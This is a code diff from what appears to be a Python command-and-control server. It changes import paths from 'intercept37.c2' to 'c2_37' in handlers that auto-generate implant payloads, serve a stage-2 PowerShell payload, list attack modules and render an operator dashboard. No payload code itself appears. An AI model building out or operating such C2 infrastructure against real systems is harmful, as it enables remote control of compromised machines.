@@ -203,7 +203,7 @@ class C2Server:
                     else:
                         # Auto-generate from implant source
                         try:
-                            from intercept37.c2 import payloads
+                            from c2_37 import payloads
                             scheme = "https" if self.c2.ssl_cert else "http"
                             host = self.headers.get("Host", f"{self.c2.host}:{self.c2.port}")
                             url = f"{scheme}://{host}"
@@ -225,7 +225,7 @@ class C2Server:
                         self.wfile.write(self.c2._stage2_ps)
                     else:
                         try:
-                            from intercept37.c2 import payloads
+                            from c2_37 import payloads
                             scheme = "https" if self.c2.ssl_cert else "http"
                             host = self.headers.get("Host", f"{self.c2.host}:{self.c2.port}")
                             url = f"{scheme}://{host}"
@@ -257,7 +257,7 @@ class C2Server:
                 # ── /api/modules — list available modules ──
                 elif self.path == "/api/modules":
                     try:
-                        from intercept37.c2.modules import list_modules
+                        from c2_37.modules import list_modules
                         self._json_response({"modules": list_modules()})
                     except ImportError:
                         self._json_response({"modules": []})
@@ -266,7 +266,7 @@ class C2Server:
                 # ── /dashboard — operator web UI ──
                 elif self.path == "/dashboard" or self.path == "/dashboard/":
                     try:
-                        from intercept37.c2.dashboard import get_dashboard_html
+                        from c2_37.dashboard import get_dashboard_html
                         html = get_dashboard_html()
                         self.send_response(200)
                         self.send_header("Content-Type", "text/html; charset=utf-8")
